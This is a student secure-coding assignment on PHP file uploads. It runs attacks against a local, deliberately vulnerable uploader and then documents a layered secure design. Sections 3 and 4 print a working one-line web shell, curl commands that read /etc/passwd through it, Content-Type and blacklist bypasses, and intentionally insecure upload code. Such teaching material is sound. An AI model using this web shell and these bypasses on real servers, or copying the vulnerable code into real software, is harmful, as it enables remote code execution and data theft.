# WEB404 — Assignment 3: Secure File Upload

**Module:** WEB404 Secure Coding Practices
**Task:** Develop a file upload feature and implement security measures to prevent malicious file uploads.
**Student ID:** 02230302

This project builds the *same* file-upload feature twice — once deliberately
**insecure**, to demonstrate the attacks, and once **secure**, implementing the
defences that stop each attack. Everything runs locally in Docker, bound to
`127.0.0.1`, and no external system is ever touched.

---

## Table of contents

1. [Introduction: why file uploads are dangerous](#1-introduction-why-file-uploads-are-dangerous)
2. [Lab setup and ethical considerations](#2-lab-setup-and-ethical-considerations)
3. [The vulnerable version and the attacks](#3-the-vulnerable-version-and-the-attacks)
4. [The secure version and its defences](#4-the-secure-version-and-its-defences)
5. [Vulnerable vs secure: code comparison](#5-vulnerable-vs-secure-code-comparison)
6. [Conclusion](#6-conclusion)
7. [Appendix: how to run, and screenshot checklist](#7-appendix)

---

## 1. Introduction: why file uploads are dangerous

A file upload feature lets a user send a file from their computer to the server.
This is ordinary and useful (profile pictures, PDFs, attachments). It becomes
dangerous when the server accepts a file **without checking what it really is**,
and then stores it somewhere the web server can **execute** it.

The worst case is **Remote Code Execution (RCE)**: an attacker uploads a small
program (a "web shell") and then runs operating-system commands on the server
simply by visiting the uploaded file's URL. From there an attacker can read
databases, steal secrets, deface the site, or use the server to attack others.

Other risks from unrestricted upload include overwriting existing files,
filling the disk (denial of service), storing malware for others to download,
and cross-site scripting via uploaded HTML/SVG.

### OWASP / CWE references

- **CWE-434: Unrestricted Upload of File with Dangerous Type** — the exact
  weakness this assignment is about.
- **OWASP Top 10 (2021) A04:2021 – Insecure Design** — accepting any file is a
  design-level failure to think about abuse.
- **OWASP Top 10 (2021) A03:2021 – Injection** — an executed upload is code
  injected into the server.
- **OWASP Top 10 (2021) A05:2021 – Security Misconfiguration** — a server
  configured to execute files in an upload directory.
- **OWASP File Upload Cheat Sheet** and **WSTG-BUSL-09 (Test Upload of
  Malicious Files)** — the defensive guidance applied in Section 4.

---

## 2. Lab setup and ethical considerations

### Environment

| Item | Value |
|------|-------|
| Server | `php:8.3-apache` (official image) via Docker Compose |
| URL | `http://127.0.0.1:4281` (loopback only) |
| Web root | `./www` → `/var/www/html` (URL-reachable; PHP executes here) |
| Secure storage | `./storage` → `/var/uploads` (**outside** the web root) |

Start the lab with a single command:

```bash
docker compose up -d
```

Then open `http://127.0.0.1:4281/` in a browser.

> [SCREENSHOT: landing page at 127.0.0.1:4281 showing the two versions]
> `screenshots/01-landing-page.png`

### Ethical considerations

- **Local only.** In `docker-compose.yml` the port is published as
  `127.0.0.1:4281:80`, **not** `0.0.0.0`. Binding to the loopback address means
  the deliberately-vulnerable app is reachable **only from this machine** — it
  is never exposed to the network or the internet.
- **No external targets.** Every attack in this report is run against my own
  local container. No third-party system is scanned or attacked.
- **Contained blast radius.** The vulnerable code runs inside a disposable
  Docker container, not on the host OS.
- **Teaching artefacts only.** The web shell used below is a standard one-line
  teaching example; it and any test uploads are git-ignored and are never
  committed or submitted.

---

## 3. The vulnerable version and the attacks

### 3.0 The vulnerable code

`www/vulnerable/index.php` saves whatever is uploaded, under the attacker's
chosen filename, into a web-accessible folder, with **no checks at all**:

```php
$name = basename($_FILES['file']['name']);   // trusts attacker's name + extension
$dest = __DIR__ . '/uploads/' . $name;
move_uploaded_file($_FILES['file']['tmp_name'], $dest);   // no validation
```

Because `uploads/` is under the web root, a `.php` file saved here can be
requested in the browser and Apache will **execute** it.

> [SCREENSHOT: the vulnerable upload form]
> `screenshots/02-vulnerable-form.png`

To make the later attacks realistic, the lab also includes two "looks-secure
but isn't" variants, and configures Apache to also execute `.phtml`/`.php5`
(a very common real-world setting; the stock image only runs `.php`):

- `www/vulnerable/naive_type.php` — trusts the browser-supplied `Content-Type`.
- `www/vulnerable/naive_blacklist.php` — blocks a list of bad extensions.

---

### 3.1 Attack 1 — Upload and execute a PHP web shell

**The payload** (`shell.php`):

```php
<?php system($_GET["cmd"]); ?>
```

`$_GET["cmd"]` reads a value from the URL; `system(...)` runs it as an OS
command and prints the output.

**Steps:**

```bash
# 1. Upload the shell through the vulnerable form.
curl -F "file=@shell.php" http://127.0.0.1:4281/vulnerable/index.php

# 2. Execute commands just by visiting the URL.
curl "http://127.0.0.1:4281/vulnerable/uploads/shell.php?cmd=id"
curl "http://127.0.0.1:4281/vulnerable/uploads/shell.php?cmd=cat%20/etc/passwd"
```

**What happened:** the server returned
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` and the contents of
`/etc/passwd`.

> [SCREENSHOT: browser showing shell.php?cmd=id returning uid=33(www-data)]
> `screenshots/03-webshell-cmd-id.png`
>
> [SCREENSHOT: the upload confirmation page for shell.php]
> `screenshots/04-webshell-uploaded.png`

**Why it worked:** the file was saved unchanged, with its `.php` extension,
into a folder under the web root. Apache maps `.php` to the PHP interpreter, so
requesting the file *ran* it. One unchecked upload = full Remote Code Execution.

---

### 3.2 Attack 2 — Bypass a naive `Content-Type` check

Target: `naive_type.php`, which only accepts the upload if
`$_FILES['file']['type']` is `image/jpeg` or `image/png`. That value is just the
`Content-Type` **the client put in the request** — PHP never verifies it.

**Steps:**

```bash
# Honest upload of the .php shell -> REJECTED (its type is not an image).
curl -F "file=@shell.php;type=application/x-php" \
     http://127.0.0.1:4281/vulnerable/naive_type.php

# Same shell, but LIE and claim it is a PNG -> ACCEPTED.
curl -F "file=@shell.php;filename=typebypass.php;type=image/png" \
     http://127.0.0.1:4281/vulnerable/naive_type.php

# The "image" is a working shell.
curl "http://127.0.0.1:4281/vulnerable/uploads/typebypass.php?cmd=id"
```

> [SCREENSHOT: terminal — honest upload REJECTED, spoofed image/png ACCEPTED, cmd=id returns uid=33]
> `screenshots/05-contenttype-bypass.png`

**Why it worked:** the `;type=image/png` part sets the request's `Content-Type`
header, which PHP copies verbatim into `$_FILES['file']['type']`. The check
compared an **attacker-controlled string** against its allow-list. The file was
still `.php`, so it still executed.

**Lesson:** the `Content-Type` header and filename are client-supplied metadata
and must never be trusted. Real defence reads the file's actual bytes.

---

### 3.3 Attack 3 — Bypass a naive extension blacklist

Target: `naive_blacklist.php`, which blocks
`php, php3, php4, php5, phar` — but **forgets `.phtml`**.

**Steps:**

```bash
# .php -> REJECTED (blacklisted).
curl -F "file=@shell.php;filename=bl_test.php" \
     http://127.0.0.1:4281/vulnerable/naive_blacklist.php

# .phtml -> ACCEPTED (forgotten), and Apache executes it.
curl -F "file=@shell.php;filename=bl_bypass.phtml" \
     http://127.0.0.1:4281/vulnerable/naive_blacklist.php
curl "http://127.0.0.1:4281/vulnerable/uploads/bl_bypass.phtml?cmd=id"

# Double extension shell.php.jpg -> ACCEPTED by the filter, but NOT executed here.
curl -F "file=@shell.php;filename=bl_double.php.jpg" \
     http://127.0.0.1:4281/vulnerable/naive_blacklist.php
curl "http://127.0.0.1:4281/vulnerable/uploads/bl_double.php.jpg?cmd=id"
```

> [SCREENSHOT: terminal — .php rejected, .phtml accepted + uid=33, .php.jpg accepted but returns source]
> `screenshots/06-blacklist-bypass.png`

**Why it worked / what it shows:**

- A blacklist must list *every* dangerous spelling; the author forgot `.phtml`,
  which this Apache executes, so the bypass gave RCE.
- `shell.php.jpg` **bypassed the filter** (the naive check only inspects the
  last extension, `.jpg`) but did **not execute**, because this server only runs
  `\.php$`, `.phtml`, `.php5`. The response was the raw PHP source.
- **Important nuance:** `shell.php.jpg` *does* achieve RCE on servers using the
  legacy `AddHandler application/x-httpd-php .php` directive, which executes any
  filename *containing* `.php`. The double-extension risk is therefore real but
  server-config-dependent — a strong reason to also disable execution in the
  upload directory (Section 4).

**Lesson:** use a **whitelist** ("only allow these"), never a blacklist.

---

### 3.4 Attack 4 — Magic bytes vs the claimed type

"Magic bytes" are the first bytes of a file that reveal its true type (a PNG
starts with `\x89PNG`, a GIF with `GIF89a`). PHP's `finfo` reads them.

```bash
# shell.php claims to be image/png, but finfo reads the real bytes:
#   shell.php    -> text/x-php   (the lie is exposed)
#   polyglot.gif -> image/gif    (magic bytes were forged: GIF89a then PHP)
```

> [SCREENSHOT: terminal — xxd byte dumps and finfo real-vs-claimed MIME types]
> `screenshots/07-magic-bytes.png`

**What this shows:**

1. Checking real content with `finfo` catches a bare `.php` shell renamed to
   `.png` (its real type is `text/x-php`, not an image). This is why content
   inspection beats trusting the header.
2. But a *polyglot* that truly begins with `GIF89a` is reported as `image/gif`
   by `finfo` even though it hides PHP. So content inspection alone is not
   enough — we must also whitelist extensions, rename files, and prevent
   execution. This motivates the layered design in Section 4.

---

## 4. The secure version and its defences

`www/secure/index.php` applies **seven** controls in order. No single control
is trusted on its own (defence in depth).

| # | Defence | Code (simplified) | Stops |
|---|---------|-------------------|-------|
| 1 | Upload-error check | `if ($f['error'] !== UPLOAD_ERR_OK)` | partial/failed uploads |
| 2 | Size limit | `if ($f['size'] > 2*1024*1024)` | disk/memory abuse |
| 3 | Extension **whitelist** | `$allowed = ['jpg'=>…,'png'=>…,'pdf'=>…]` | `.php`, `.phtml`, anything unlisted |
| 4 | Real MIME via **finfo** | `$realMime = (new finfo(FILEINFO_MIME_TYPE))->file($tmp)` | `Content-Type` spoofing |
| 5 | Content **matches** extension | `if ($realMime !== $allowed[$ext])` | type/extension mismatch, most polyglots |
| 6 | **Random rename** | `bin2hex(random_bytes(16)).'.'.$ext` | attacker-chosen name/extension, overwrites |
| 7 | Store **outside web root** | `move_uploaded_file($tmp, '/var/uploads/'.$name)` | execution via URL |

Key excerpt:

```php
$allowed = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg',
            'png'=>'image/png','pdf'=>'application/pdf'];

$ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
if (!isset($allowed[$ext])) { /* reject: not whitelisted */ }

$realMime = (new finfo(FILEINFO_MIME_TYPE))->file($f['tmp_name']);
if ($realMime !== $allowed[$ext]) { /* reject: content != extension */ }

$safeName = bin2hex(random_bytes(16)) . '.' . $ext;   // discard attacker's name
move_uploaded_file($f['tmp_name'], '/var/uploads/' . $safeName);  // outside web root
```

Files are stored outside the web root, so they are served back through a small
guarded script, `www/secure/view.php`, which accepts only our own random-name
pattern (also blocking path traversal), sets a fixed `Content-Type`, adds
`X-Content-Type-Options: nosniff`, and uses `readfile` — it never executes.

### 4.1 A genuine image is accepted

A real PNG is accepted, renamed randomly, and stored outside the web root:

```
ACCEPTED. Stored outside the web root as: 2e5d7fb8…034.png
```

> [SCREENSHOT: browser — secure uploader accepting a real image, showing the random stored name and view.php link]
> `screenshots/08-secure-accept-image.png`
>
> [SCREENSHOT: optional — the image served back safely via view.php]
> `screenshots/09-secure-view-image.png`

### 4.2 Every earlier attack now fails

| Attack | Result against the secure uploader |
|--------|------------------------------------|
| `shell.php` web shell | **REJECTED** — extension not on whitelist |
| `Content-Type: image/png` spoof on `.php` | **REJECTED** — real content `text/x-php` ≠ `.png` |
| `.phtml` blacklist bypass | **REJECTED** — extension not on whitelist |
| GIF/PHP polyglot as `.gif` or `.png` | **REJECTED** — ext not allowed / content mismatch |
| Oversize (3 MB) file | **REJECTED** — size limit (enforced at two levels) |
| Valid-PNG **+ appended PHP** | **ACCEPTED, but neutralised** (see below) |

> [SCREENSHOT: terminal — all attacks REJECTED by the secure uploader]
> `screenshots/10-secure-attacks-rejected.png`

**The neutralised case (most important point).** A file with real PNG magic
bytes *and* PHP appended passes the content check (its true type is
`image/png`). It is still harmless because: (6) it is renamed to an
unpredictable name, and (7) it is stored outside the web root. Requested back
through `view.php?...&cmd=id`, the response is the raw PNG bytes
(`\x89PNG…IHDR`), **not** command output — the embedded PHP is never run.

> [SCREENSHOT: terminal — polyglot ACCEPTED but ?cmd=id returns PNG bytes, not uid=]
> `screenshots/11-secure-polyglot-neutralised.png`

### 4.3 Defence: disabling PHP execution in a directory (the alternative)

When uploads *must* live under the web root, the alternative to "store outside"
is to tell Apache never to execute code there.
`apache/disable-exec-uploads.conf`:

```apache
<Directory /var/www/html/exec-disabled-demo>
    php_admin_flag engine off
    <FilesMatch "\.(php|phtml|php3|php4|php5|phar)$">
        SetHandler none
    </FilesMatch>
</Directory>
```

- `php_admin_flag engine off` turns the PHP engine off for that directory.
- `SetHandler none` strips the PHP handler for script extensions (belt and braces).

**Proof:** a live shell placed in the hardened folder is served as **text**,
while the same shell in a normal folder executes:

```
/exec-disabled-demo/planted.php?cmd=id  ->  <?php system($_GET["cmd"]); ?>   (NOT executed)
/planted_control.php?cmd=id             ->  uid=33(www-data) …               (executed)
```

> [SCREENSHOT: terminal — hardened folder returns source, control folder returns uid=33]
> `screenshots/12-apache-exec-disabled.png`

**Outside web root vs execution-disabled:** storing outside the web root is the
strongest option (there is no URL to the files at all). Disabling execution is
useful when files must stay under the web root, but depends on correct, ongoing
server configuration. Where possible, do both.

---

## 5. Vulnerable vs secure: code comparison

| Concern | Vulnerable (`vulnerable/index.php`) | Secure (`secure/index.php`) |
|--------|--------------------------------------|------------------------------|
| Filename | keeps attacker's name + extension | random `bin2hex(random_bytes(16))` + safe ext |
| Extension | none | **whitelist** `jpg/jpeg/png/pdf` |
| Type check | none | `finfo` reads **real** magic bytes |
| Content vs extension | none | must match |
| Size | unlimited | 2 MB (plus PHP's own limit) |
| Storage | `uploads/` **inside** web root | `/var/uploads` **outside** web root |
| Serving | direct URL (executes `.php`) | `view.php` (regex-checked, `nosniff`, `readfile`) |
| Result | Remote Code Execution | uploads cannot be executed |

Side by side, the save step:

```php
// VULNERABLE: trust everything, save under the web root.
$name = basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], __DIR__.'/uploads/'.$name);

// SECURE: validate, then save with a random name outside the web root.
$ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
if (!isset($allowed[$ext])) reject();
if ((new finfo(FILEINFO_MIME_TYPE))->file($f['tmp_name']) !== $allowed[$ext]) reject();
$safe = bin2hex(random_bytes(16)).'.'.$ext;
move_uploaded_file($f['tmp_name'], '/var/uploads/'.$safe);
```

---

## 6. Conclusion

An unrestricted file upload is one of the most damaging web weaknesses because
it can lead directly to **Remote Code Execution**. This lab showed four
concrete attacks against an insecure uploader — a web shell, a `Content-Type`
spoof, an extension-blacklist bypass, and the magic-bytes problem — and then
defeated every one with a layered secure design.

The key principles, each demonstrated:

1. **Never trust client-supplied data** — not the filename, not the
   `Content-Type`. Read the file's real content with `finfo`.
2. **Whitelist, don't blacklist** — allow a known-good set; deny everything else.
3. **Rename uploads** so the attacker controls neither the name nor the path.
4. **Limit size** to prevent abuse.
5. **Prevent execution** — store files outside the web root (strongest), or
   disable execution in the upload directory, ideally both.

No single check is sufficient; security comes from **defence in depth**, so that
even a file that slips past one control is stopped by the next.

---

## 7. Appendix

### How to run

```bash
docker compose up -d                      # start the lab
# open http://127.0.0.1:4281/
docker compose down                       # stop and remove the container
```

Layout:

```
.
├── docker-compose.yml                    # PHP+Apache, bound to 127.0.0.1:4281
├── apache/
│   ├── php-extra-extensions.conf         # also execute .phtml/.php5 (realistic)
│   └── disable-exec-uploads.conf         # disable execution in a demo folder
├── www/                                  # web root (/var/www/html)
│   ├── index.php                         # landing page
│   ├── vulnerable/
│   │   ├── index.php                     # insecure uploader
│   │   ├── naive_type.php                # naive Content-Type check
│   │   └── naive_blacklist.php           # naive extension blacklist
│   └── secure/
│       ├── index.php                     # secure uploader (7 defences)
│       └── view.php                      # safe retrieval
└── storage/                              # /var/uploads — OUTSIDE the web root
```

### Screenshot checklist

- [ ] `screenshots/01-landing-page.png` — lab landing page at `127.0.0.1:4281`
- [ ] `screenshots/02-vulnerable-form.png` — vulnerable upload form
- [ ] `screenshots/03-webshell-cmd-id.png` — web shell running `id` (uid=www-data)
- [ ] `screenshots/04-webshell-uploaded.png` — web shell upload confirmation
- [ ] `screenshots/05-contenttype-bypass.png` — Content-Type spoof bypass
- [ ] `screenshots/06-blacklist-bypass.png` — `.phtml` bypass + `.php.jpg` test
- [ ] `screenshots/07-magic-bytes.png` — magic bytes vs claimed type (finfo)
- [ ] `screenshots/08-secure-accept-image.png` — secure uploader accepts a real image
- [ ] `screenshots/09-secure-view-image.png` — (optional) image served via view.php
- [ ] `screenshots/10-secure-attacks-rejected.png` — all attacks rejected by secure version
- [ ] `screenshots/11-secure-polyglot-neutralised.png` — polyglot accepted but inert
- [ ] `screenshots/12-apache-exec-disabled.png` — execution disabled in hardened folder
